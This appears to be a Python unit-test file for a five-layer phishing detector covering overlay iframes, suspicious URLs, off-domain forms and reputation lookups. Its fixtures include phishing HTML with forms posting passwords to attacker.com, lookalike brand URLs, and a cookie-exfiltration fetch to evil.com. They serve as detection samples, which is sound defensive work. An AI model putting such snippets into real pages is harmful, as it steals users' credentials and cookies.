"""
C2 Unit Tests — Phishing Detection (all 5 layers)
Run from project root:  python test/C2/test_c2_layers.py
"""
import sys
import os
import asyncio
import unittest

_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if _ROOT not in sys.path:
    sys.path.insert(0, _ROOT)

from core.c2.layer1_bitb       import check_bitb
from core.c2.layer2_url        import check_url, extract_features as l2_extract
from core.c2.layer4_form       import check_form
from core.c2.layer5_reputation import check_reputation


def run(coro):
    return asyncio.get_event_loop().run_until_complete(coro)


# ── Layer 1: BitB / HTML Phishing ─────────────────────────────────────────────
class TestLayer1BitB(unittest.TestCase):

    PHISH_DOM = """
    <html>
    <head><title>Microsoft Login</title></head>
    <body>
      <iframe style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:99999;" src="https://evil.com/login">
      </iframe>
      <form action="https://attacker.com/steal" method="POST">
        <input type="password" name="pass"/>
        <input type="hidden" name="csrf" value="abc"/>
      </form>
      <script src="https://cdn.evil.com/tracker.js"></script>
    </body>
    </html>
    """

    BENIGN_DOM = """
    <html><head><title>My Blog</title></head>
    <body><p>Hello world!</p></body>
    </html>
    """

    def test_phishing_dom_returns_high_score(self):
        result = run(check_bitb("https://evil-login.com/auth", self.PHISH_DOM))
        self.assertIn("score", result)
        self.assertGreater(result["score"], 0.3,
                           "Phishing DOM should score above 0.3")

    def test_benign_dom_returns_low_score(self):
        result = run(check_bitb("https://myblog.com/", self.BENIGN_DOM))
        self.assertIn("score", result)
        self.assertLess(result["score"], 0.75,
                        "Benign DOM should score below 0.75")

    def test_result_has_required_keys(self):
        result = run(check_bitb("https://example.com", self.BENIGN_DOM))
        self.assertIn("score", result)
        self.assertIn("detail", result)

    def test_score_clamped_between_0_and_1(self):
        result = run(check_bitb("https://evil.com", self.PHISH_DOM))
        self.assertGreaterEqual(result["score"], 0.0)
        self.assertLessEqual(result["score"], 1.0)

    def test_empty_dom_does_not_crash(self):
        result = run(check_bitb("https://example.com", ""))
        self.assertIn("score", result)

    def test_brand_impersonation_detected(self):
        dom = """<html><head><title>PayPal Login</title>
        <link rel="icon" href="/paypal-favicon.ico"/>
        </head><body><form><input type="password"/></form></body></html>"""
        result = run(check_bitb("https://paypa1-secure.com/login", dom))
        self.assertIn("score", result)

    def test_overlay_iframe_flagged(self):
        dom = """<html><body>
        <iframe style="position:fixed;width:100%;height:100%;z-index:9999;"
                src="https://bank-login.evil.com"></iframe>
        </body></html>"""
        result = run(check_bitb("https://random.com", dom))
        self.assertGreater(result["score"], 0.0)


# ── Layer 2: URL Classifier ────────────────────────────────────────────────────
class TestLayer2URL(unittest.TestCase):

    PHISH_URLS = [
        "http://paypal-secure-login.yolasite.com/update",
        "https://microsoft.verify-account.xyz/signin",
        "http://apple.com.account-suspended.tk/recover",
        "https://bit.ly/3xEvil",                         # URL shortener
        "http://192.168.1.1/bank/login?user=admin",      # IP-based
    ]

    BENIGN_URLS = [
        "https://www.google.com/search?q=python",
        "https://github.com/anthropics/anthropic-sdk-python",
        "https://en.wikipedia.org/wiki/Main_Page",
    ]

    def test_phishing_urls_score_higher(self):
        for url in self.PHISH_URLS:
            result = run(check_url(url))
            self.assertIn("score", result, f"Missing score for {url}")
            self.assertGreater(result["score"], 0.0,
                               f"Phishing URL scored 0: {url}")

    def test_benign_urls_score_lower(self):
        for url in self.BENIGN_URLS:
            result = run(check_url(url))
            self.assertIn("score", result)
            self.assertLess(result["score"], 0.8,
                            f"Benign URL scored too high: {url}")

    def test_result_has_required_keys(self):
        result = run(check_url("https://example.com"))
        self.assertIn("score", result)
        self.assertIn("detail", result)

    def test_score_clamped_0_to_1(self):
        for url in self.PHISH_URLS + self.BENIGN_URLS:
            result = run(check_url(url))
            self.assertGreaterEqual(result["score"], 0.0)
            self.assertLessEqual(result["score"], 1.0)

    def test_empty_url_does_not_crash(self):
        result = run(check_url(""))
        self.assertIsInstance(result, dict)

    def test_feature_extraction_keys_present(self):
        feats = l2_extract("https://paypal-login.verify.com/signin")
        self.assertIsInstance(feats, dict)
        expected_keys = ["url_len", "has_ip", "has_phish_kw", "subdomain_depth"]
        for k in expected_keys:
            self.assertIn(k, feats, f"Missing feature key: {k}")

    def test_brand_in_host_flagged(self):
        feats = l2_extract("https://paypal.secure-login.com/account")
        self.assertEqual(feats.get("brand_in_host", 0), 1,
                         "Brand in host should be flagged")

    def test_free_tld_flagged(self):
        feats = l2_extract("http://freehost.tk/phish")
        self.assertEqual(feats.get("is_free_tld", 0), 1,
                         ".tk TLD should be flagged as free")

    def test_url_shortener_flagged(self):
        feats = l2_extract("https://bit.ly/shorten")
        self.assertEqual(feats.get("is_short_svc", 0), 1,
                         "bit.ly should be identified as a shortener")


# ── Layer 4: Form Destination Analysis ────────────────────────────────────────
class TestLayer4Form(unittest.TestCase):

    def test_off_domain_form_scores_high(self):
        dom = """<html><body>
        <form action="https://attacker.com/steal" method="POST">
          <input type="password" name="pass"/>
        </form>
        </body></html>"""
        result = run(check_form("https://legitimate-bank.com/login", dom))
        self.assertGreater(result["score"], 0.5,
                           "Off-domain password form should score > 0.5")

    def test_same_domain_form_scores_zero(self):
        dom = """<html><body>
        <form action="/submit" method="POST">
          <input type="text" name="user"/>
          <input type="password" name="pass"/>
        </form>
        </body></html>"""
        result = run(check_form("https://mybank.com/login", dom))
        self.assertEqual(result["score"], 0.0,
                         "Same-domain form should score 0")

    def test_empty_dom_returns_zero(self):
        result = run(check_form("https://example.com", ""))
        self.assertEqual(result["score"], 0.0)

    def test_js_exfiltration_pattern_detected(self):
        dom = """<html><body>
        <script>fetch('https://evil.com/exfil', {method:'POST', body: document.cookie});</script>
        </body></html>"""
        result = run(check_form("https://victim.com", dom))
        self.assertGreater(result["score"], 0.0,
                           "JS data exfiltration pattern should raise score")

    def test_no_form_returns_zero(self):
        dom = "<html><body><p>Just a blog post.</p></body></html>"
        result = run(check_form("https://blog.com", dom))
        self.assertEqual(result["score"], 0.0)

    def test_result_has_detail_field(self):
        dom = "<html><body><form><input type='password'/></form></body></html>"
        result = run(check_form("https://example.com", dom))
        self.assertIn("detail", result)

    def test_multiple_off_domain_forms_accumulate(self):
        dom = """<html><body>
        <form action="https://stealer1.com/get" method="POST">
          <input type="password"/>
        </form>
        <form action="https://stealer2.com/get" method="POST">
          <input type="password"/>
        </form>
        </body></html>"""
        result = run(check_form("https://victim.com/login", dom))
        self.assertGreater(result["score"], 0.5)


# ── Layer 5: Reputation Check ──────────────────────────────────────────────────
class TestLayer5Reputation(unittest.TestCase):
    """Tests that call check_reputation without real API keys.
    These validate graceful fallback — no key means no false positives."""

    def test_clean_url_not_flagged_without_key(self):
        result = run(check_reputation("https://www.google.com", gsb_key=""))
        self.assertIn("flagged", result)
        self.assertFalse(result["flagged"],
                         "google.com should not be flagged without an API key")

    def test_result_has_required_keys(self):
        result = run(check_reputation("https://example.com", gsb_key=""))
        self.assertIn("flagged", result)
        self.assertIn("source", result)
        self.assertIn("score", result)

    def test_score_is_zero_without_api_key(self):
        result = run(check_reputation("https://example.com", gsb_key=""))
        self.assertEqual(result["score"], 0.0,
                         "Score should be 0 when no API key provided")

    def test_does_not_crash_on_invalid_url(self):
        result = run(check_reputation("not-a-url", gsb_key=""))
        self.assertIn("flagged", result)

    def test_does_not_crash_on_empty_url(self):
        result = run(check_reputation("", gsb_key=""))
        self.assertIn("flagged", result)


if __name__ == "__main__":
    print("\n=== C2 Phishing Detection Unit Tests ===\n")
    unittest.main(verbosity=2)
